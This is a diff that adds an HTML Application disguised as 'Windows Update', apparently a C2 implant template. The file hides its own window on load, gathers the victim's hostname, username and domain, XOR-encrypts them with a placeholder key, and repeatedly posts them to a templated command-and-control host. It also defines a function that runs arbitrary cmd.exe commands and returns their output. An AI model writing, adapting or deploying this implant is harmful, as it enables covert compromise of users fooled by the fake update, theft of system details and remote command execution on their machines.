@@ -1,0 +1,126 @@
+<html>
+<head>
+    <title>Windows Update</title>
+    <HTA:APPLICATION
+        ID="oHTA"
+        APPLICATIONNAME="Windows Update"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize"/>
+    <script language="VBScript">
+        Sub Window_OnLoad
+            window.resizeTo 0,0
+            window.moveTo -2000,-2000
+            ConnectToC2
+        End Sub
+
+        Function XOREncrypt(data)
+            Dim key, encrypted, i
+            key = "C2_SECRET_KEY_CHANGE_THIS"
+            encrypted = ""
+            For i = 1 To Len(data)
+                encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1)))
+            Next
+            XOREncrypt = Base64Encode(encrypted)
+        End Function
+
+        Function Base64Encode(sText)
+            Dim oXML, oNode
+            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+            Set oNode = oXML.CreateElement("base64")
+            oNode.dataType = "bin.base64"
+            oNode.nodeTypedValue = Stream_StringToBinary(sText)
+            Base64Encode = oNode.text
+            Set oNode = Nothing
+            Set oXML = Nothing
+        End Function
+
+        Function Stream_StringToBinary(Text)
+            Const adTypeText = 2
+            Const adTypeBinary = 1
+            Dim BinaryStream
+            Set BinaryStream = CreateObject("ADODB.Stream")
+            BinaryStream.Type = adTypeText
+            BinaryStream.CharSet = "us-ascii"
+            BinaryStream.Open
+            BinaryStream.WriteText Text
+            BinaryStream.Position = 0
+            BinaryStream.Type = adTypeBinary
+            Stream_StringToBinary = BinaryStream.Read
+            BinaryStream.Close
+            Set BinaryStream = Nothing
+        End Function
+
+        Function GetMetadata()
+            Dim wshShell, wshNetwork, metadata
+            Set wshShell = CreateObject("WScript.Shell")
+            Set wshNetwork = CreateObject("WScript.Network")
+
+            metadata = "{" & _
+                """type"":""register""," & _
+                """metadata"":{" & _
+                """hostname"":""" & wshNetwork.ComputerName & """," & _
+                """username"":""" & wshNetwork.UserName & """," & _
+                """os"":""Windows""," & _
+                """domain"":""" & wshNetwork.UserDomain & """" & _
+                "}" & _
+                "}"
+
+            GetMetadata = metadata
+        End Function
+
+        Function ExecuteCommand(cmd)
+            On Error Resume Next
+            Dim wshShell, exec, output
+            Set wshShell = CreateObject("WScript.Shell")
+            Set exec = wshShell.Exec("cmd.exe /c " & cmd)
+
+            Do While exec.Status = 0
+                WScript.Sleep 100
+            Loop
+
+            output = exec.StdOut.ReadAll()
+            If output = "" Then
+                output = exec.StdErr.ReadAll()
+            End If
+
+            If output = "" Then
+                output = "Command executed successfully (no output)"
+            End If
+
+            ExecuteCommand = output
+        End Function
+
+        Sub ConnectToC2()
+            ' Note: VBScript HTA doesn't support WebSockets natively
+            ' This would require ActiveX or alternative implementation
+            ' For demonstration purposes, showing the structure
+
+            Dim http, c2_url, metadata, encrypted
+            c2_url = "http://{{C2_HOST}}:{{C2_PORT}}/register"
+
+            Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+            ' Fallback to HTTP polling for HTA
+            Do While True
+                On Error Resume Next
+
+                ' Register
+                metadata = GetMetadata()
+                encrypted = XOREncrypt(metadata)
+
+                http.Open "POST", c2_url, False
+                http.setRequestHeader "Content-Type", "application/json"
+                http.send encrypted
+
+                WScript.Sleep 5000
+            Loop
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
